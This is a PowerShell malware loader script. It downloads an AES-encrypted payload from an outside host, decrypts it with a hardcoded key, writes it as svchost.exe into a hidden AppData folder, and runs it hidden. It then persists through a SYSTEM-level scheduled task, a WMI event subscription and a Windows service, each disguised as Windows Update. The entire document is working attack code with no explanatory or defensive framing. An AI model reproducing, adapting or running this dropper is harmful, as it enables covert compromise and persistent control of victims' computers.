# Function to download and decrypt payload
function Download-AndDecrypt {
    param (
        [string]$Url,
        [string]$OutputPath,
        [string]$HexKey
    )
    
    try {
        # Create a WebClient object
        $webClient = New-Object System.Net.WebClient
        
        # Set TLS 1.2
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        # Add headers to mimic the C++ code
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
        $webClient.Headers.Add("Accept", "*/*")
        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.9")
        $webClient.Headers.Add("Connection", "keep-alive")
        $webClient.Headers.Add("Cache-Control", "no-cache")
        
        # Download the encrypted payload
        $encryptedData = $webClient.DownloadData($Url)
        
        # Convert hex key to bytes
        $keyBytes = [byte[]]::new(32)
        for ($i = 0; $i -lt 64; $i += 2) {
            $keyBytes[$i/2] = [Convert]::ToByte($HexKey.Substring($i, 2), 16)
        }
        
        # Create AES object
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 128
        $aes.BlockSize = 128
        $aes.Key = $keyBytes
        
        # Extract IV from first 16 bytes
        $iv = $encryptedData[0..15]
        $aes.IV = $iv
        
        # Decrypt the data
        $decryptor = $aes.CreateDecryptor()
        $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 16, $encryptedData.Length - 16)
        
        # Save the decrypted payload
        [System.IO.File]::WriteAllBytes($OutputPath, $decryptedData)
        
        # Clean up
        $decryptor.Dispose()
        $aes.Dispose()
        $webClient.Dispose()
        
        return $true
    }
    catch {
        return $false
    }
}

# Create a hidden directory in AppData
$persistenceDir = "$env:APPDATA\Microsoft\Windows\Update"
if (-not (Test-Path $persistenceDir)) {
    New-Item -ItemType Directory -Path $persistenceDir -Force | Out-Null
    attrib +h $persistenceDir
}

# Download and decrypt the payload
$payloadUrl = "https://crypto.harrylee.id.vn/enc_nt205.bin"
$payloadPath = "$persistenceDir\svchost.exe"
$decryptionKey = "df6b7d1be3467b0805b831bfed90b69a649381393efbb9cb295d1d307f78e650"

if (Download-AndDecrypt -Url $payloadUrl -OutputPath $payloadPath -HexKey $decryptionKey) {
    # Execute the decrypted payload
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
    
    # Create a scheduled task to run the payload
    $action = New-ScheduledTaskAction -Execute $payloadPath
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -Hidden

    # Register the scheduled task
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

    # Create a WMI event subscription for persistence
    $filterName = "WindowsUpdateFilter"
    $consumerName = "WindowsUpdateConsumer"

    # Create WMI event filter for system startup
    $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_OperatingSystem' AND TargetInstance.LastBootUpTime <> PreviousInstance.LastBootUpTime"
    $filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
        Name = $filterName
        EventNameSpace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = $filterQuery
    } -ErrorAction Stop

    # Create WMI event consumer
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = $consumerName
        ExecutablePath = $payloadPath
        CommandLineTemplate = $payloadPath
    } -ErrorAction Stop

    # Bind filter to consumer
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filter
        Consumer = $consumer
    } -ErrorAction Stop
}

# Create a service for additional persistence
$serviceName = "WindowsUpdateService"
$serviceDisplayName = "Windows Update Service"
$serviceDescription = "Provides support for Windows Update"

# Check if service already exists
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if (-not $service) {
    New-Service -Name $serviceName `
                -DisplayName $serviceDisplayName `
                -Description $serviceDescription `
                -BinaryPathName $payloadPath `
                -StartupType Automatic `
                -ErrorAction Stop
}

# Start the service if it's not running
if ($service.Status -ne 'Running') {
    Start-Service -Name $serviceName -ErrorAction Stop
} 